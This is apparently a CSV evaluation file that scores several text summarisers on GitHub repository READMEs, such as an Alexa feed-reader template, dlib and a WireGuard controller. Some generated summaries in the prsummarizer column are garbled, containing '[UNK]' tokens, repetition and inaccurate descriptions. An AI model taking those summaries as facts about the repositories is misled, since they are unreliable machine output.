,id,link,summary,lex_rank,edmunson,lead_cm,prsummarizer,lead_cm score,prsummarizer score
511,137492184,https://api.github.com/repos/Jam3/adviser-plugin-dependencies,Adviser plugin with rules to ensure the use of healthy dependencies,integration tests to run your rules with adviser we recommend you to create an empty folder we have one under .examplesintegration with an example package.json with example packages in case is related with security make sure to include some of them that fail your test an adviser configuration file.,adviserplugindependencies plugin for adviser that contains rules related to dependencies in the package.json installation youll first need to install adviser next install note if you installed adviser globally using the flag then you must also install globally.,adviserplugindependencies plugin for adviser that contains rules related to dependencies in the package.json installation youll first need to install adviser next install note if you,plugin for adviser that contains rules related to dependencies in the packagejson,0.18018,0.28985666666666665
512,137349715,https://api.github.com/repos/jpoley/skill-sample-nodejs-feed,An Alexa Skill Template to help create skills that read RSS/Atom feeds. ,usage repository contents ask cli command line interface configuration backend logic for the alexa skill hosted on aws lambda voice user interface and language specific interaction models stepbystep instructions for getting started skill manifest setup w ask cli prerequisites node.js v4.3 register for an aws account register for an amazon developer account install and setup ask cli installation clone the repository.,build an alexa feed reader skill build a feed reader skill for alexa this tutorial will walk firsttime alexa skills developers through all the required steps involved in creating a feed reading skill using a template called ‘feed reader’.,build an alexa feed reader skill build a feed reader skill for alexa this tutorial will walk firsttime alexa skills developers through all the required,tutorial tutorial to build a feed reader for [UNK] [UNK] [UNK],0.19493333333333326,0.11111333333333334
513,136865476,https://api.github.com/repos/Beinger/unioffice,"Pure go library for creating and processing Office Word (.docx), Excel (.xlsx) and Powerpoint (.pptx) documents",status documents docx word readwriteedit formatting images tables spreadsheets xlsx excel readwriteedit cell formatting including conditional formatting cell validation drop down combobox rules etc.,announcement 20190429 unidoc aquires gooxml.,announcement 20190429 unidoc aquires gooxml. unidoc httpsunidoc.io and httpsgithub.comunidoc has aquired gooxml from baliance and we plan to add it to our suite of document,template to add it to our suite of document format,0.09302,0.05128
514,136730438,https://api.github.com/repos/wizardnet972/graphql-normalizr,Normalize GraphQL responses for persisting in the client cache/state,if you want to use arrays for whatever reason set this to true for the same response object in our previous example js const normalize new graphqlnormalizr lists true normalizeresponse users id 5a6efb94b0e8c36f99fba013 email lloyd.nikolausyahoo.com typenames boolean default is false.,graphqlnormalizr normalize graphql responses for persisting in the client cachestate.,graphqlnormalizr normalize graphql responses for persisting in the client cachestate. not related in any way to normalizr just shamelessly piggybacking on its popularity. also normalizer,normalize graphql responses for persisting in the client to text,0.44617666666666667,0.7925933333333335
515,136645530,https://api.github.com/repos/Yinfeng-Ma/pytorch-examples,Simple examples to introduce PyTorch,table of contents warmup numpy pytorch tensors pytorch autograd pytorch defining new autograd functions tensorflow static graphs pytorch nn pytorch optim pytorch custom nn modules pytorch control flow and weight sharing warmup numpy before introducing pytorch we will first implement the network using numpy.,this repository introduces the fundamental concepts of pytorch through selfcontained examples.,this repository introduces the fundamental concepts of pytorch through selfcontained examples. at its core pytorch provides two main features an ndimensional tensor similar to numpy,[UNK] repository for building and training neural networks,0.13333333333333333,0.0
516,136616198,https://api.github.com/repos/kevinmiles/Infinite-Toolkit---Learning-Labs,"In this repository, various basic examples, samples apps and explanations to start using the REF API in order to develop your own cloud client using digital TV services. Once you're connected to Cisco sandbox, the client application has access to Live cha",we write these labs for display within the cisco devnet learning labs system.,deactivated cisco devnet learning labs infinite toolkit these labs are now deactivated.,deactivated cisco devnet learning labs infinite toolkit these labs are now deactivated. these selfpaced interactive tutorials provide instructions for developers to learn that the infinite,[UNK] toolkit for developers to learn that interact with devnet container,0.06862666666666667,0.04938
517,137320789,https://api.github.com/repos/ltotsas/cross-platform-controller-arduino-devices,A cross platform application to control arduino based devices to support their functionalities,the goal of this project is to support the functionality of arduino based devices which they connect into a server.,cross platform controller using ionic magic develop once and export to ios or android with angular.,cross platform controller using ionic magic develop once and export to ios or android with angular. the goal of this project is to support the,cross platform controller using ionic magic once and export to ios or android with angular,0.23001999999999997,0.21611999999999998
518,136865795,https://api.github.com/repos/danlavee/rest980,REST interface to control your iRobot Roomba 980 via local server on your lan.,use preferences to set lang week time post y get in firmware 1. only get in firmware 2 preferences carpetboostauto only post.,rest980 rest980 create a http server to map all dorita980 methods in a rest api to control your irobot roomba 900 series 980 i7 i7 via http requests.,rest980 rest980 create a http server to map all dorita980 methods in a rest api to control your irobot roomba 900 series 980 i7 i7,a http server to map all dorita980 methods in a rest api to control your irobot,0.3284833333333333,0.31587333333333334
519,137216797,https://api.github.com/repos/jmg31077/laravel-laradock-phpstorm,"Wiring up Laravel, LaraDock [Laravel+Docker] and PHPStorm to play nice together complete with remote xdebug'ing as icing on top!",wiring up laravel laradock laraveldocker and phpstorm to play nice together complete with remote xdebuging as icing on top intro installation windows docker laravel laradock customized workspace customized laradockdockercompose.yml clean house laradock dial tone ssh into phpfpm kitty phpstorm configs usage laravel run exampletest debug exampletest debug web site intro goal is to put together a sample laravel project running on laradock that can run in a development environment complete with remote debugging.,laravellaradockphpstorm note this project has been deprecated.,laravellaradockphpstorm note this project has been deprecated. i am refactoring these docs into a phpstorm debugging guide which is currently a pull request. wiring up,[UNK] application to reinforce your phpstorm file in a phpstorm container,0.08761999999999999,0.0625
520,136615482,https://api.github.com/repos/wuye9036/dlib,A toolkit for making real world machine learning and data analysis applications in C++,compiling dlib python api before you can run the python example programs you must compile dlib.,dlib c library dlib is a modern c toolkit containing machine learning algorithms and tools for creating complex software in c to solve real world problems.,dlib c library dlib is a modern c toolkit containing machine learning algorithms and tools for creating complex software in c to solve real world,dlib toolkit containing machine learning algorithms and tools for creating complex software in c to solve real world problems,0.34465,0.3675466666666667
521,137351288,https://api.github.com/repos/zjw0358/python-broqer,"Carefully crafted library to operate with continuous streams of data in a reactive style with publish/subscribe, asyncio support and broker functionality.",using asyncio event loop publisher basic publisher statefulpublisher init publisher keeping an internal state frompolling interval func ... call funcargs kwargs periodically and emit the returned values operators accumulate func init apply funcvalue state which is returning new state and value to emit cache init caching the emitted values to access it via .cache property catchexception exceptions catching exceptions of following operators in the pipelines combinelatest publishers combine the latest emit of multiple publishers and emit the combination filter predicate ... filters values based on a predicate function map mapfunc args kwargs apply mapfuncargs value kwargs to each emitted value merge publishers merge emits of multiple publishers into one stream partition size group size emits into one emit as tuple reduce func init apply func to the current emitted value and the last result of func replace value replace each received value by the given value slidingwindow size ... group size emitted values overlapping switch mapping emit selected source mapped by mapping using asyncio event loop debounce duetime resetvalue emit a value only after a given idle time emits meanwhile are skipped delay delay emit every value delayed by the given time mapasync mapcoro mode ... apply mapcoro to each emitted value allowing async processing mapthreaded mapfunc mode ... apply mapfunc to each emitted value allowing threaded processing sample interval emit the last received value periodically throttle duration rate limit emits by the given time subscribers a subscriber is the sink for messages.,python broqer .. image httpsimg.shields.iopypivbroqer.svg target httpspypi.python.orgpypibroqer .. image httpsimg.shields.iotravissemiversuspythonbroqermaster.svg target httpstravisci.orgsemiversuspythonbroqer .. image httpsreadthedocs.orgprojectspythonbroqerbadgeversionlatest target httpspythonbroqer.readthedocs.ioenlatest .. image httpscodecov.ioghsemiversuspythonbroqerbranchmastergraphbadge.svg target httpscodecov.ioghsemiversuspythonbroqer .. image httpsimg.shields.iogithublicensesemiversuspythonbroqer.svg target httpsen.wikipedia.orgwikimitlicense initial focus on embedded systems broqer can be used wherever continuous streams of data have to be processed and they are everywhere.,python broqer .. image httpsimg.shields.iopypivbroqer.svg target httpspypi.python.orgpypibroqer .. image httpsimg.shields.iotravissemiversuspythonbroqermaster.svg target httpstravisci.orgsemiversuspythonbroqer .. image httpsreadthedocs.orgprojectspythonbroqerbadgeversionlatest target httpspythonbroqer.readthedocs.ioenlatest .. image httpscodecov.ioghsemiversuspythonbroqerbranchmastergraphbadge.svg target httpscodecov.ioghsemiversuspythonbroqer .. image httpsimg.shields.iogithublicensesemiversuspythonbroqer.svg,python is a tool to build applications with applications on embedded systems,0.0,0.09804
522,136961858,https://api.github.com/repos/Cheukting/picknmix,A simple tool to help building stacking models.,.. image https1.bp.blogspot.coms8sszvfprmv1qkcxfcvniaaaaaaaad0i8uufyre4mqqyyuwsxroovx3zrfw93nclwclcbs1600stacking.png a stacking new model meta learner is trained from the combined predictions of two or more previous model.,image httpsgithub.compicknmixpicknmixrawmasterlogopicknmixlogo.png pick n mix .. image httpsimg.shields.iopypivpicknmix.svg target httpspypi.python.orgpypipicknmix .. image httpsimg.shields.iotravispicknmixpicknmix.svg target httpstravisci.orgpicknmixpicknmix .. image httpsreadthedocs.orgprojectspicknmixbadgeversionlatest target httpspicknmix.readthedocs.ioenlatestbadgelatest alt documentation status .. image httpsimg.shields.iobadgelicensemityellow.svg target httpsopensource.orglicensesmit alt license badge .. image httpscodecov.ioghpicknmixpicknmixbranchmastergraphbadge.svg target httpscodecov.ioghpicknmixpicknmix a simple tool to help building stacking models.,image httpsgithub.compicknmixpicknmixrawmasterlogopicknmixlogo.png pick n mix .. image httpsimg.shields.iopypivpicknmix.svg target httpspypi.python.orgpypipicknmix .. image httpsimg.shields.iotravispicknmixpicknmix.svg target httpstravisci.orgpicknmixpicknmix .. image httpsreadthedocs.orgprojectspicknmixbadgeversionlatest target httpspicknmix.readthedocs.ioenlatestbadgelatest alt documentation status .. image,simple tool to help building stacking models,0.0,0.9299133333333334
523,137172642,https://api.github.com/repos/graylevel255/robust-physical-attack,Physical adversarial attack for fooling the Faster R-CNN object detector,the untargeted perturbation in c was never detected as a stop sign or anything else.,shapeshifter robust physical adversarial attack on faster rcnn object detector overview this is the code repository for the ecmlpkdd 2018 paper shapeshifter robust physical adversarial attack on faster rcnn object detector the arxiv version is available at httpsarxiv.orgabs1804.05810 the code included here reproduces our techniques presented in the paper.,shapeshifter robust physical adversarial attack on faster rcnn object detector overview this is the code repository for the ecmlpkdd 2018 paper shapeshifter robust physical adversarial,robust physical adversarial attack on crafting rcnn object [UNK] [UNK] [UNK] to fool [UNK] object detectors like faster object,0.31808000000000003,0.3603166666666667
524,136923740,https://api.github.com/repos/akk7300/jQuery.print,"Easy to use, Element Printing Plugin for jQuery",jquery print plugin jquery.print is a plugin for printing specific parts of a page usage include it in your html after importing jquery like use it like or you can submit the options object like currently this plugin supports the following options globalstyles default acceptablevalues boolean function whether or not the styles from the parent document should be included mediaprint default acceptablevalues boolean function whether or not link tags with mediaprint should be included overriden by the option stylesheet default acceptablevalues urlstring function url of an external stylesheet to be included noprintselector default acceptablevalues any valid function a selector for the items that are to be excluded from printing iframe default creates a hidden iframe if novaild iframe selector is passed acceptablevalues any valid or boolean function whether to print from an iframe instead of a popup window can take the jqueryselector of an existing iframe as value appendprepend default null acceptablevalues any valid jqueryselector or htmltext function adds custom html before prepend or after append the selected content manuallycopyformvalues default true acceptablevalues boolean function should it copy userupdated form input values onto the printed markup this is done by manually iterating over each form element deferred default .deferred acceptablevalues any valid jquery.deferred object function a jquery.deferred object that is resolved once the print function is called.,jquery print plugin jquery.print is a plugin for printing specific parts of a page usage include it in your html after importing jquery like use it like or you can submit the options object like currently this plugin supports the following options globalstyles default acceptablevalues boolean function whether or not the styles from the parent document should be included mediaprint default acceptablevalues boolean function whether or not link tags with mediaprint should be included overriden by the option stylesheet default acceptablevalues urlstring function url of an external stylesheet to be included noprintselector default acceptablevalues any valid function a selector for the items that are to be excluded from printing iframe default creates a hidden iframe if novaild iframe selector is passed acceptablevalues any valid or boolean function whether to print from an iframe instead of a popup window can take the jqueryselector of an existing iframe as value appendprepend default null acceptablevalues any valid jqueryselector or htmltext function adds custom html before prepend or after append the selected content manuallycopyformvalues default true acceptablevalues boolean function should it copy userupdated form input values onto the printed markup this is done by manually iterating over each form element deferred default .deferred acceptablevalues any valid jquery.deferred object function a jquery.deferred object that is resolved once the print function is called.,jquery print plugin jquery.print is a plugin for printing specific parts of a page usage include it in your html after importing jquery like use,plugin for [UNK] specific parts of a page,0.21814,0.21428666666666665
525,137347439,https://api.github.com/repos/CompwhizTech/awesome-visibility,Curated list to achieve visibility for your product,list of directories or communities to submit your idea startup product to get visibility.,awesome visibility curating the best links to get visibility for your products.,awesome visibility curating the best links to get visibility for your products. list of directories or communities to submit your idea startup product to get,curating best links to get visibility for your products list of directories or communities to submit your idea,0.3271433333333333,0.4166666666666667
526,137106676,https://api.github.com/repos/wpannell/domain-story-modeler,A tool to visualize Domain Stories in your browser,domain storytelling modeler a tool to visualize domain stories in your browser.,domain storytelling modeler a tool to visualize domain stories in your browser.,domain storytelling modeler a tool to visualize domain stories in your browser. about httpdomainstorytelling.org run the modeler you can try the modeler online at httpswww.wps.demodeler.,tool to visualize domain stories in your browser,0.47671,0.9385633333333333
527,137499038,https://api.github.com/repos/b-schd/automatic_text_scheduler,Miscellaneous projects to make life easier and more fun :),once you have generated the file return to the python console and type y without the quotes this will load each scheduled job onto your compputers crontab.,automatic text scheduler have you ever wanted to automatically send text messages to your friends on their birthdays or maybe you wanted to randomly send checkin messages to your longdistance friends every few weeks just to keep in touch this script allows you to set up random texts to one person or preset scheduled texts to multiple friends from your computer.,automatic text scheduler have you ever wanted to automatically send text messages to your friends on their birthdays or maybe you wanted to randomly send,script allows you to set up random messages to multiple friends on their computer,0.03921333333333333,0.05797333333333333
528,136589332,https://api.github.com/repos/keydunov/grape-apiary,Allows for generating an Apiary Blueprint (http://apiary.io) for you Grape API,vs what if someone does not use json create sample response for list endpoints array add support for writing the blueprint to disk add an option to include root in json contributing fork it httpgithub.comconnexiolabsgrapeapiaryfork create your feature branch commit your changes push to the branch create new pull request,grapeapiary auto generates an apiary blueprint from the docuementation that is created by your grape api.,grapeapiary auto generates an apiary blueprint from the docuementation that is created by your grape api. note this is an early implementation that makes some,early implementation that is created to create your grape apiary in the grape api,0.2846,0.17481333333333335
529,137545524,https://api.github.com/repos/rozcietrzewiacz/kubewg,Use Kubernetes to manage & distribute Wireguard configuration,the guardlet is run using the peername flag and will automatically apply the wireguard configuration on the named peer resource to the local wireguard installation in order to configure the vpn network.,kubewg kubewg is a kubernetes controller that allows you to configure and manage wireguard vpn configuration using a kubernetes api server.,kubewg kubewg is a kubernetes controller that allows you to configure and manage wireguard vpn configuration using a kubernetes api server. it introduces the following,kubernetes controller that allows you to configure and manage wireguard vpn configuration,0.20833333333333331,0.35088
530,137542918,https://api.github.com/repos/CocodingLee/RSCustomTabbarController,This is super flexible Custom tab bar controller implementation. You have the complete opportunity to customise according to your necessity ( ## Also support swift ## ),rscustomtabbarcontroller this is super flexible custom tab bar controller implementation.,rscustomtabbarcontroller this is super flexible custom tab bar controller implementation.,rscustomtabbarcontroller this is super flexible custom tab bar controller implementation. you have the complete opportunity to customise according to your necessity. want to check on,flexible tab bar controller implementation to create custom tab and complete complete to your custom experience connects controller,0.8309233333333333,0.37815
531,136899366,https://api.github.com/repos/JamaicanDevelopers/collective.behavior.localdiazo,Dexterity behavior to enable a local Diazo theme.,.. figure httpsraw.github.comcollectivecollective.behavior.localdiazomaster1.png align center height 670px width 700px add a new object you will see a new field called theme and select a diazo theme from the list.,collective.behavior.localdiazo .. contents table of contents life the universe and everything dexterity behavior to enable a local diazo theme.,collective.behavior.localdiazo .. contents table of contents life the universe and everything dexterity behavior to enable a local diazo theme. this package aims to make easier,package aims to make easier creation of microsites web web web sites,0.45956,0.06666666666666667
532,136651802,https://api.github.com/repos/Guillaume98765/MixedRealityToolkit-Unity,MixedRealityToolkit-Unity uses code from the base MixedRealityToolkit repository and makes it easier to consume in Unity.,provides the basic building blocks for unity development on hololens windows mixed reality and openvr.,what is the mixed reality toolkit mrtk is a microsoft driven open source project.,what is the mixed reality toolkit mrtk is a microsoft driven open source project. mrtkunity provides a set of foundational components and features to accelerate,set of foundational components and features to process mr app in 3d,0.09524,0.13793333333333332
533,137139371,https://api.github.com/repos/arjunyel/ngx-avatar,Universal avatar component for angular 2+ applications makes it possible to fetch / generate  avatar from different sources,avatarconfig interface has two properties avatarcolors allows the user to override the default avatar colors by providing a new set of colors sourcepriorityorder allows the user to change the avatar source priority order.,a universal avatar component for angular 2 applications that fetches generates avatar based on the information you have about the user.,a universal avatar component for angular 2 applications that fetches generates avatar based on the information you have about the user. the component has a,universal avatar component for [UNK] 2,0.4507933333333334,0.38509
534,136695289,https://api.github.com/repos/dbinary/antergos-iso,Scripts based on archiso to create the Antergos ISO,cd homeuserantergosisoconfigsantergos check text configuration file config with your favourite text editor build the iso sudo .build.sh build if you want to try to build the iso again please remember to clean all generated files first sudo .build.sh clean,antergos iso antiso modified version of archiso to build the antergos iso livecd dependencies antergosgfxboot for a graphical boot or isolinuxsyslinux archinstallscripts cpio dosfstools gfxboot libisoburn mkinitcpionfsutils make opendesktopfonts patch squashfstools wget free space please check that you have 5gb or more of free harddisk space in your root partition instructions without docker install dependencies clone this repository using like this enter into antergosiso folder and change to the testing branch install our modified mkarchiso and configurations by running while inside the folder clone antergosgfxboot and use antergosgfxboot branch create and destination folders the folder will store the livecd filesystem while the folder will store your new iso file.,antergos iso antiso modified version of archiso to build the antergos iso livecd dependencies antergosgfxboot for a graphical boot or isolinuxsyslinux archinstallscripts cpio dosfstools gfxboot,[UNK] is a type of archiso to build the antergos boot or wget for openshift [UNK],0.25858000000000003,0.27130333333333334
535,136634104,https://api.github.com/repos/SuperOldDriver/x264,Unofficial X264 with added custom native Visual Studio project build tools. X264: A free software library and application for encoding video streams into the H.264/MPEG-4 AVC format.,all code from the upstream repository remains under its original license see the license information of the upstream repository for more details.,shiftmediaproject x264 shiftmediaproject shift media project aims to provide native windows development libraries for x264 and associated dependencies to support simpler creation and debugging of rich media content directly within visual studio.,shiftmediaproject x264 shiftmediaproject shift media project aims to provide native windows development libraries for x264 and associated dependencies to support simpler creation and debugging of,x264 project to provide native windows development libraries for x264 and associated dependencies to support simpler,0.13332999999999998,0.15941666666666668
536,137605602,https://api.github.com/repos/GuillaumePou/Trabajo_de_grado,"This repository presents the code of my \trabajo de grado\"" realized to obtain the undergraduate degree in electronic engineering from the \""Pontificia Universidad Javerian\"" of Bogota""",it is one of the videos used for the project.,trabajo de grado this repository presents the code of my trabajo de grado realized to obtain an undergraduate degree in electronic engineering from the pontificia universidad javeriana of bogota and a master degree from the french engineering school inpenseeiht.,trabajo de grado this repository presents the code of my trabajo de grado realized to obtain an undergraduate degree in electronic engineering from the pontificia,repository presents the code of my trabajo de method to obtain an undergraduate degree in electronic,0.8075233333333333,0.62778
537,136566243,https://api.github.com/repos/jamieburchell/ansible-selinux-role,Advanced Base role to configure selinux through variables.,the following variables are used to configure selinux policy and state the following variables are used to toggle selinux booleans the following variables are used to configure selinux ports the following variables are used to configure selinux fcontexts example playbook license mit,ansibleselinuxrole allows you to configure selinux.,ansibleselinuxrole allows you to configure selinux. config options policy state booleans ports fcontexts requirements tested on rhel 7 and centos 7 only. ansible 2.0 or,allows you to configure selinux config options policy state state [UNK],0.15931333333333333,0.2889566666666667
538,136624254,https://api.github.com/repos/cibofdevs/storage-blobs-php-quickstart,Code for QuickStart article for accessing blobs with PHP,create a storage account using the azure portal first create a new generalpurpose storage account to use for this quickstart.,services storage platforms php author roygara transfer objects to and from azure blob storage using php this repository contains a simple sample project to help you getting started with azure storage using .net as the development language.,services storage platforms php author roygara transfer objects to and from azure blob storage using php this repository contains a simple sample project to help,simple sample project to transfer started with azure storage using net as the development language,0.07843333333333334,0.05556
539,137395151,https://api.github.com/repos/oci-quickstart-forks/oci-quickstart-arangodb,Terraform module to deploy ArangoDB on Oracle Cloud Infrastructure (OCI),when the deployment is completed it will show you the public ip of the instance created on oracle cloud infrastructure oci.,ociquickstartarangodb this is a terraform module that deploys arrangodb on oracle cloud infrastructure oci.,ociquickstartarangodb this is a terraform module that deploys arrangodb on oracle cloud infrastructure oci. they are developed jointly by oracle and arrangodb. prerequisites first off,terraform module to deploy arrangodb on oracle cloud infrastructure,0.40577,0.7967
540,136688244,https://api.github.com/repos/glandisch/aem-core-wcm-components,"Adobe Experience Manager (AEM) Sites Core Components - flexible, extensible, and feature-rich components to build sites",the released version of the core components are available on the public maven repository at httpsrepo1.maven.orgmaven2comadobecqcore.wcm.components.all for projects using maven archetype 17 and below to include the core components package into your own projects maven build using aems maven archetype 17 and below you can add the dependency to your pom.xml like this and then add this subpackage to your sub package section inside the configuration of the contentpackagemavenplugin.,aem sites core components a set of standardized components for aem 6.3 that can be used to speed up development of websites.,aem sites core components a set of standardized components for aem 6.3 that can be used to speed up development of websites. documentation component library,set of standardized components for aem 63 that can be used to speed up development of websites,0.2404733333333333,0.10101
541,136694073,https://api.github.com/repos/pushpen/awesome-woocommerce,Plugins and code snippets to improve your WooCommerce store.,this is useful when you have the cart and checkout on the same page.,awesome woocommerce plugins and code snippets for your woocommerce store.,awesome woocommerce plugins and code snippets for your woocommerce store. table of contents handy code snippets and plugins action scheduler woocommerce code snippets gist links,woocommerce code snippets for multiple your woocommerce store,0.37868,0.5254933333333334
542,137331039,https://api.github.com/repos/fabienpe/indy-catalyst,Hyperledger Indy Catalyst is a set of application level software components designed to accelerate the adoption of trustworthy entity to entity communications. ,hyperledger indy catalyst table of contents introduction decentralized identity selfsovereign identity open standards decentralized identifiers did verifiable credentials links to emerging did and verifiable credentials standards did standards verifiable credentials standards general model technology distributed ledger technology blockchain decentralized key management systems zero knowledge proofs summary decentralized identity selfsovereign identity architecture hyperledger indy overview technical information for hyperledger indy hyperledger indy catalyst motivation who is indy catalyst for key technical elements credential registry agent agent driver starter kits credential registry holderprover agent issuerverifier endnotes introduction hyperledger indy catalyst is a set of application level software components designed to accelerate the adoption of trustworthy entity to entity1 communications based on decentralized identity selfsovereign identity technology and architecture.,hyperledger indy catalyst table of contents introduction decentralized identity selfsovereign identity open standards decentralized identifiers did verifiable credentials links to emerging did and verifiable credentials standards did standards verifiable credentials standards general model technology distributed ledger technology blockchain decentralized key management systems zero knowledge proofs summary decentralized identity selfsovereign identity architecture hyperledger indy overview technical information for hyperledger indy hyperledger indy catalyst motivation who is indy catalyst for key technical elements credential registry agent agent driver starter kits credential registry holderprover agent issuerverifier endnotes introduction hyperledger indy catalyst is a set of application level software components designed to accelerate the adoption of trustworthy entity to entity1 communications based on decentralized identity selfsovereign identity technology and architecture.,hyperledger indy catalyst table of contents introduction decentralized identity selfsovereign identity open standards decentralized identifiers did verifiable credentials links to emerging did and verifiable credentials,open standards identifiers did credentials links to emerging did and verifiable credentials standards,0.17147,0.03809333333333333
543,136596950,https://api.github.com/repos/dirty-south-supercomputing/BOLT,Binary Optimization and Layout Tool - A linux command-line utility used for optimizing performance of binaries,these heuristics have been tested on a code generated with clang and gcc compilers.,bolt bolt is a postlink optimizer developed to speed up large applications.,bolt bolt is a postlink optimizer developed to speed up large applications. it achieves the improvements by optimizing applications code layout based on execution profile,is a postlink optimizer developed to speed up large applications,0.09756000000000001,0.10256666666666665
